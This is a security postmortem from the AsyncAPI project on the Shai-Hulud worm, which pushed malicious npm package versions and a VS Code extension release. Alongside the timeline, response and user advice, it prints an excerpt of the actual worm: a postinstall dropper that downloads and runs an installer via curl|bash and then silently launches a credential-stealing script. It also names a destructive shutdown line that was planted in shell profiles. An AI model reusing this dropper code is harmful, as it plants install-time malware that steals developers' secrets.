---
title: Shai-Hulud — What Happened, How We Fixed It, and What We Learned
date: 2025-11-26T16:56:08.828Z
type: Communication
tags:
  - Security
  - Incident
  - Postmortem
cover: /img/posts/shai-hulud-postmortem/shai-hulud-banner.webp
authors:
  - name: Ashish Padhy
    photo: /img/avatars/shurtugal.webp
    link: https://www.linkedin.com/in/ashish-padhy3023
    byline: AsyncAPI Maintainer
excerpt: 'A postmortem of the supply-chain compromise that affected published packages on npm and related registries.'
---

On November 24, 2025, our systems experienced a significant security incident that impacted our dependents and users. This postmortem aims to provide a detailed account of what happened, how we addressed the issue, and the lessons we learned to prevent future occurrences.

## Incident Timeline

 **Mon, 24 Nov 2025**
  - `03:58:47 UTC` — Pushing of malicious package versions to the NPM registry.
  - `10:02:00 UTC` — [Report by Charlie Eriksen](https://www.aikido.dev/blog/shai-hulud-strikes-again-hitting-zapier-ensdomains) from Aikido about compromised packages.
  - `10:32:00 UTC` — Acknowledgment of the issue by the AsyncAPI team, and communication initiated to inform the community.
  - `10:42:00 UTC` — Initial investigation and revoking of NPM tokens.
  - `10:58:00 UTC` — Reported the incident to the NPM security team and started deprecating affected packages, as unpublishing is not allowed with dependent packages.
  - `11:46:00 UTC` — Action taken by the NPM security team to unpublish the malicious packages.
  - `13:33:00 UTC` — Suspected leak found in [vs-asyncapi-preview](https://github.com/asyncapi/vs-asyncapi-preview), as malicious version (1.0.1) was pushed to [OpenVSX Registry](https://open-vsx.org/extension/asyncapi/asyncapi-preview) through report from [Yusuke Sugamiya](https://x.com/DNPP)
  - `13:45:00 UTC` — Revoked OpenVSX token and reported to OpenVSX security team.
  - `13:52:00 UTC` — OpenVSX team unpublished the malicious package version.
  - `15:45:00 UTC` — Incident report writing started.

## What Happened

On the morning of November 24, 2025, we were alerted by Charlie Eriksen from Aikido about suspicious activity involving several AsyncAPI-related packages on the npm registry. Upon investigation, we discovered that unauthorized versions of our packages had been published, containing malicious code designed to exfiltrate sensitive information from users' environments. This was further verified by Charlie, who identified it as a Shai-Hulud worm attack. 

Simultaneously, we were notified by [Yusuke Sugamiya](https://x.com/DNPP) that one of our Visual Studio Code extensions, [vs-asyncapi-preview](https://open-vsx.org/extension/asyncapi/asyncapi-preview), had also been compromised, with a malicious version (1.0.1) being published to the OpenVSX registry.

All AsyncAPI packages had malicious versions published with a pattern of two bad patch releases. Example: for package version 1.2.3, versions 1.2.4 and 1.2.5 were malicious. The malicious code was designed to collect environment variables and send them to an external server controlled by the attacker. More on the technical details can be found in [Aikido's detailed analysis](https://www.aikido.dev/blog/shai-hulud-strikes-again-hitting-zapier-ensdomains). 

This attack was part of a broader campaign that also targeted other organizations, including Postman, Zapier, and ENS Domains. The worm works by scanning environment variables for sensitive information and publishing them in the user's public repositories. The code for worm propagation is located in the `bun_environment.js` file within the malicious package versions. And the same is run through `setup_bun.js` during package postinstall script execution. One example of how this works was in v1.0.1 of `vs-asyncapi-preview` extension, which had an `npm install github:asyncapi/cli#2efa4dff59bc3d3cecdf897ccf178f99b115d63d` pointing to a [commit in a malicious fork](https://github.com/asyncapi/cli/commit/2efa4dff59bc3d3cecdf897ccf178f99b115d63d) which holds the above files.

```
async ["bundleAssets"](_0x349b3d) {
    let _0x2bd41c = a0_0x459ea5.join(_0x349b3d, 'package', "setup_bun.js");
    await iL0(_0x2bd41c, "#!/usr/bin/env node\nconst { spawn, execSync } = require('child_process');\nconst path = require('path');\nconst fs = require('fs');\nconst os = require('os');\n\nfunction isBunOnPath() {\n  try {\n    const command = process.platform === 'win32' ? 'where bun' : 'which bun';\n    execSync(command, { stdio: 'ignore' });\n    return true;\n  } catch {\n    return false;\n  }\n}\n\nfunction reloadPath() {\n  // Reload PATH environment variable\n  if (process.platform === 'win32') {\n    try {\n      // On Windows, get updated PATH from registry\n      const result = execSync('powershell -c \"[Environment]::GetEnvironmentVariable(\\'PATH\\', \\'User\\') + \\';\\' + [Environment]::GetEnvironmentVariable(\\'PATH\\', \\'Machine\\')\"', {\n        encoding: 'utf8'\n      });\n      process.env.PATH = result.trim();\n    } catch {\n    }\n  } else {\n    try {\n      // On Unix systems, source common shell profile files\n      const homeDir = os.homedir();\n      const profileFiles = [\n        path.join(homeDir, '.bashrc'),\n        path.join(homeDir, '.bash_profile'),\n        path.join(homeDir, '.profile'),\n        path.join(homeDir, '.zshrc')\n      ];\n\n      // Try to source profile files to get updated PATH\n      for (const profileFile of profileFiles) {\n        if (fs.existsSync(profileFile)) {\n          try {\n            const result = execSync(`bash -c \"source ${profileFile} && echo $PATH\"`, {\n              encoding: 'utf8',\n              stdio: ['pipe', 'pipe', 'ignore']\n            });\n            if (result && result.trim()) {\n              process.env.PATH = result.trim();\n              break;\n            }\n          } catch {\n            // Continue to next profile file\n          }\n        }\n      }\n\n      // Also check if ~/.bun/bin exists and add it to PATH if not already there\n      const bunBinDir = path.join(homeDir, '.bun', 'bin');\n      if (fs.existsSync(bunBinDir) && !process.env.PATH.includes(bunBinDir)) {\n        process.env.PATH = `${bunBinDir}:${process.env.PATH}`;\n      }\n    } catch {}\n  }\n}\n\nasync function downloadAndSetupBun() {\n  try {\n    let command;\n    if (process.platform === 'win32') {\n      // Windows: Use PowerShell script\n      command = 'powershell -c \"irm bun.sh/install.ps1|iex\"';\n    } else {\n      // Linux/macOS: Use curl + bash script\n      command = 'curl -fsSL https://bun.sh/install | bash';\n    }\n\n    execSync(command, {\n      stdio: 'ignore',\n      env: { ...process.env }\n    });\n\n    // Reload PATH to pick up newly installed bun\n    reloadPath();\n\n    // Find bun executable after installation\n    const bunPath = findBunExecutable();\n    if (!bunPath) {\n      throw new Error('Bun installation completed but executable not found');\n    }\n\n    return bunPath;\n  } catch  {\n    process.exit(0);\n  }\n}\n\nfunction findBunExecutable() {\n  // Common locations where bun might be installed\n  const possiblePaths = [];\n\n  if (process.platform === 'win32') {\n    // Windows locations\n    const userProfile = process.env.USERPROFILE || '';\n    possiblePaths.push(\n      path.join(userProfile, '.bun', 'bin', 'bun.exe'),\n      path.join(userProfile, 'AppData', 'Local', 'bun', 'bun.exe')\n    );\n  } else {\n    // Unix locations\n    const homeDir = os.homedir();\n    possiblePaths.push(\n      path.join(homeDir, '.bun', 'bin', 'bun'),\n      '/usr/local/bin/bun',\n      '/opt/bun/bin/bun'\n    );\n  }\n\n  // Check if bun is now available on PATH\n  if (isBunOnPath()) {\n    return 'bun';\n  }\n\n  // Check common installation paths\n  for (const bunPath of possiblePaths) {\n    if (fs.existsSync(bunPath)) {\n      return bunPath;\n    }\n  }\n\n  return null;\n}\n\nfunction runExecutable(execPath, args = [], opts = {}) {\n  const child = spawn(execPath, args, {\n    stdio: 'ignore',\n    cwd: opts.cwd || process.cwd(),\n    env: Object.assign({}, process.env, opts.env || {})\n  });\n\n  child.on('error', (err) => {\n    process.exit(0);\n  });\n\n  child.on('exit', (code, signal) => {\n    if (signal) {\n      process.exit(0);\n    } else {\n      process.exit(code === null ? 1 : code);\n    }\n  });\n}\n\n// Main execution\nasync function main() {\n  let bunExecutable;\n\n  if (isBunOnPath()) {\n    // Use bun from PATH\n    bunExecutable = 'bun';\n  } else {\n    // Check if we have a locally downloaded bun\n    const localBunDir = path.join(__dirname, 'bun-dist');\n    const possiblePaths = [\n      path.join(localBunDir, 'bun', 'bun'),\n      path.join(localBunDir, 'bun', 'bun.exe'),\n      path.join(localBunDir, 'bun.exe'),\n      path.join(localBunDir, 'bun')\n    ];\n\n    const existingBun = possiblePaths.find(p => fs.existsSync(p));\n\n    if (existingBun) {\n      bunExecutable = existingBun;\n    } else {\n      // Download and setup bun\n      bunExecutable = await downloadAndSetupBun();\n    }\n  }\n\n  const environmentScript = path.join(__dirname, 'bun_environment.js');\n  if (fs.existsSync(environmentScript)) {\n    runExecutable(bunExecutable, [environmentScript]);\n  } else {\n    process.exit(0);\n  }\n}\n\nmain().catch((error) => {\n  process.exit(0);\n});\n");
    let _0x3ed61a = process.argv[0x1];
    if (_0x3ed61a && (await My1(_0x3ed61a))) {
      let _0x1028dd = await mL0(_0x3ed61a);
      if (_0x1028dd !== null) {
        let _0x4cc8b3 = a0_0x459ea5.join(_0x349b3d, "package", "bun_environment.js");
        await iL0(_0x4cc8b3, _0x1028dd);
      }
    }
  }
```

This led to [24k compromised repositories](https://github.com/search?q=Sha1-Hulud%3A+The+second+coming&type=repositories) spawning on GitHub.

![Affected Repositories](/img/posts/shai-hulud-postmortem/affected.png)

## Our Response

When we learned about the incident, we immediately started our incident response protocol. Our first steps included:
- Revoking all npm and OpenVSX tokens to prevent further unauthorized access.
- Deprecating the affected package versions on npm and OpenVSX registries.
- Collaborating with the npm and OpenVSX security teams to remove the malicious package versions.
- Maintaining open communication with our community and security researchers on Slack.

### Next Steps

- Conduct a thorough security audit of our publishing processes and infrastructure.
- Publish a GitHub Security Advisory detailing the incident and our response.

## How it Happened: Attack Chain

The investigation is still ongoing, but preliminary findings suggest that the attacker gained access to our npm and OpenVSX publishing tokens, possibly through a compromised CI/CD pipeline or a leaked token in a public repository. Once they had access, they were able to publish malicious versions of our packages without our knowledge. We don't yet know when or how the initial compromise occurred, but as our CI/CD pipelines have recently been audited, we feel that the token leak had occurred a long time ago, as we have not rotated the NPM token.

We are also 100% confident that the tokens were not stolen from any local machine. Our OpenVSX token was configured a long time ago, stored exclusively in GitHub repository secrets, and no team member ever had a local copy or password associated with it. Additionally, the npm bot user’s password had been lost for an extended period; it actually took us four months to recover access, during which 2FA was enforced as part of the account restoration. No one on the team had access to this password at any point, further ruling out the possibility of local compromise.

## Are You Affected?
> Malicious versions are no longer in NPM. They were permanently deleted by the NPM team. You can no longer access or install them.

If you have used any of the affected packages, we recommend taking the following steps:
1. **Audit Your Environment**: Check for any unusual activity or changes in your environment variables
2. **Update Dependencies**: Ensure that you are using the latest, non-malicious versions of the affected packages. The best way to do this is to delete your `node_modules` folder and lock files and reinstall your dependencies as the malicious versions have been unpublished.
3. **Rotate Credentials**: If you suspect that any sensitive information may have been compromised, rotate your credentials immediately.
4. Review your [GitHub security log](https://github.com/settings/security-log?q=action%3Arepo.create) for suspicious repositories that were created unexpectedly.
5. Check your ~/.bashrc or ~/.zshrc for suspicious additions like sudo shutdown -h 0.

## Lessons Learned

Regardless of how much we prepare, security incidents can still occur. This incident has highlighted several areas for improvement:

- We no longer plan to use NPM tokens for our publishing process and were in the process of switching to the recently released [Trusted Publisher](https://docs.npmjs.com/trusted-publishers/) using **OIDC (OpenID Connect)** authentication when this incident occurred. This effectively connects our GitHub repo, our CI pipeline, and the NPM registry.

- Have backup maintainers with publishing rights and revoking rights for tokens to reduce single points of failure.
- Token rotation and limited scope tokens should be enforced. The NPM token we were using was three years old and has now been revoked.
- Got to know about a [workflow with unsecured context](https://github.com/asyncapi/cli/blob/master/.github/workflows/auto-changeset.yml) in GitHub Actions. Although it is not the root cause here, we have fixed it to avoid any future risks in [PR #1909](https://github.com/asyncapi/cli/pull/1909)


**If you have any further questions or need assistance, please do not hesitate to reach out to us at [security@asyncapi.com](mailto:security@asyncapi.com)**

